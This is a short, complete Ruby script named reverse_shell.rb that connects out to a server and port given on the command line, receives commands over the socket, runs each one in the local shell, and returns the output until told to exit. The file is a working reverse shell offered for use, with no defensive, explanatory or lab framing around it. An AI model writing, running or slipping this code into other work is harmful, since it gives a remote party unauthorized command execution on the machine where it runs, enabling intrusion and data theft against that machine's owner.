require 'socket'

# Define the ReverseShell class
class ReverseShell
  def initialize(server, port)
    @server = server
    @port = port
  end

  def start
    begin
      socket = TCPSocket.new(@server, @port) # Connect to the server
      while true
        command = socket.gets.chomp           # Read commands from the server
        break if command.downcase == "exit"  # Exit on "exit" command
        result = execute_command(command)
        socket.puts(result)                  # Send output back to the server
      end
    rescue => e
      puts "Error: #{e.message}"
    ensure
      socket.close if socket
    end
  end

  private

  def execute_command(command)
    output = `#{command}` # Execute the command
    output.empty? ? "Command executed with no output." : output
  end
end

# Create a ReverseShell object and start it
if ARGV.length != 2
  puts "Usage: ruby reverse_shell.rb <server> <port>"
  exit
end

server, port = ARGV
shell = ReverseShell.new(server, port.to_i)
shell.start
